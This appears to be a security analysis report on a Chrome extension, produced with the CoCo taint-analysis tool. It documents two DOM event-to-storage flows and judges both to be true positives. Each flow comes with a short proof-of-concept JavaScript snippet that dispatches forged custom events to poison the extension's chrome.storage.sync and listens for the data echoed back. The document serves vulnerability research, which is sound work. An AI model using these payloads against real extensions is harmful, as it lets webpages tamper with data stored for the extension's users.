# CoCo Analysis: ljhlhmcgeihfdnomokbkgbhfddjlkeoc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6 (all part of related flows)

---

## Sink: document_eventListener_Rockfort_StoreResult → chrome_storage_sync_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ljhlhmcgeihfdnomokbkgbhfddjlkeoc/opgen_generated_files/cs_0.js
Line 615: document.addEventListener('Rockfort_StoreResult', function (e)
Line 617: var data = e.detail;
Line 619-624: llmdata.topics=data.topics; ... llmdata.llmkey=data.llmkey;
Line 625: chrome.storage.sync.set({ [data.llmkey]: JSON.stringify(llmdata) });
```

**Code:**
```javascript
// Content script (cs_0.js) - Entry point: DOM event listener
document.addEventListener('Rockfort_StoreResult', function (e) { // ← attacker can dispatch
  var data = e.detail; // ← attacker-controlled
  llmdata = {}
  llmdata.topics = data.topics; // ← attacker-controlled
  llmdata.findings = data.findings; // ← attacker-controlled
  llmdata.status = data.status; // ← attacker-controlled
  llmdata.topiclist = data.topiclist; // ← attacker-controlled
  llmdata.scantime = new Date();
  llmdata.llmkey = data.llmkey; // ← attacker-controlled key
  chrome.storage.sync.set({ [data.llmkey]: JSON.stringify(llmdata) }); // Storage poisoning
});

// Retrieval path - Data is read back and dispatched to webpage
chrome.storage.sync.get([llmkey], (data) => {
  result = data[llmkey] ? JSON.parse(data[llmkey]) : [];
  // ... result contains attacker-poisoned data ...
  jsondata.livecount = result['livecount'] === undefined ? 0 : result['livecount'];
  document.dispatchEvent(new CustomEvent('Rockfort_ScanFlag', {detail: JSON.stringify(jsondata)})) // ← attacker can listen
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom event listener via `document.addEventListener`

**Attack:**
```javascript
// From any webpage (content script runs on chatgpt.com, gemini.google.com, chat.deepseek.com)
// Per methodology: IGNORE manifest content_scripts matches restrictions

// Step 1: Poison storage with attacker data
document.dispatchEvent(new CustomEvent('Rockfort_StoreResult', {
  detail: {
    topics: 'malicious_topics',
    findings: 'malicious_findings',
    status: 'malicious_status',
    topiclist: 'malicious_topiclist',
    llmkey: 'attacker_key'
  }
}));

// Step 2: Listen for the data to be dispatched back
document.addEventListener('Rockfort_ScanFlag', function(e) {
  console.log('Retrieved poisoned data:', e.detail);
  // Attacker receives the poisoned data back
});
```

**Impact:** Complete storage exploitation chain. An attacker on any webpage can:
1. Inject arbitrary data into the extension's chrome.storage.sync with an attacker-controlled key
2. The extension later retrieves this poisoned data
3. The poisoned data is dispatched back to the webpage via CustomEvent 'Rockfort_ScanFlag'
4. Attacker can listen for this event and retrieve the poisoned data

This demonstrates a full write-read cycle where the attacker controls both the storage key and values, and can retrieve the data back through the CustomEvent mechanism.

---

## Sink: document_eventListener_Rockfort_LiveScan → chrome_storage_sync_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ljhlhmcgeihfdnomokbkgbhfddjlkeoc/opgen_generated_files/cs_0.js
Line 628: document.addEventListener('Rockfort_LiveScan', function (e)
Line 630: var data = e.detail;
Line 633-636: chrome.storage.sync.get/set with attacker data
```

**Code:**
```javascript
// Content script (cs_0.js) - Entry point: DOM event listener
document.addEventListener('Rockfort_LiveScan', function (e) { // ← attacker can dispatch
  var data = e.detail; // ← attacker-controlled
  console.log('Result Received', data);
  var result = {};
  chrome.storage.sync.get([llmkey], (ipdata) => {
    result = ipdata[llmkey] ? JSON.parse(ipdata[llmkey]) : [];
    result.livecount = data; // ← attacker-controlled value merged into storage
    chrome.storage.sync.set({ [llmkey]: JSON.stringify(result) });
  });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom event listener via `document.addEventListener`

**Attack:**
```javascript
// From any webpage
document.dispatchEvent(new CustomEvent('Rockfort_LiveScan', {
  detail: { malicious: 'livecount_data' }
}));
```

**Impact:** Storage poisoning where attacker can inject arbitrary 'livecount' data into existing storage records. Combined with the Rockfort_StoreResult vulnerability, this allows comprehensive control over the extension's stored data.
